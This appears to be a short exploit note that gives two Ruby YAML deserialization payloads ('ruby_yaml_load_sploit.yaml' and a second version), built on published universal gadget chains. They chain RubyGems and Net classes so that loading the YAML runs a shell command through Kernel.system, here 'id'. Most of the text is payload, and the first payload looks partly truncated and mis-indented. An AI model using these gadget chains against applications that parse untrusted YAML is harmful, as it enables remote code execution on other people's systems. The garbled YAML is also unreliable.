

Based on excellent write-up from https://www.elttam.com.au/blog/ruby-deserialization/

Doesn't work to use YAML.dump(payload) in the above script. This only produces the following YAML, which is worthless:

--- !ruby/object:Gem::Requirement
requirements:
- - ">="
  - !ruby/object:Gem::Version
    version: '0'

This is just a handcrafted conversion of the serialization done by Marshal.dump


Second version is based on the more recent and equally excellent writup from https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
ruby_yaml_load_sploit.yaml
```
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
ruby_yaml_load_sploit2.yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
         
 ```        
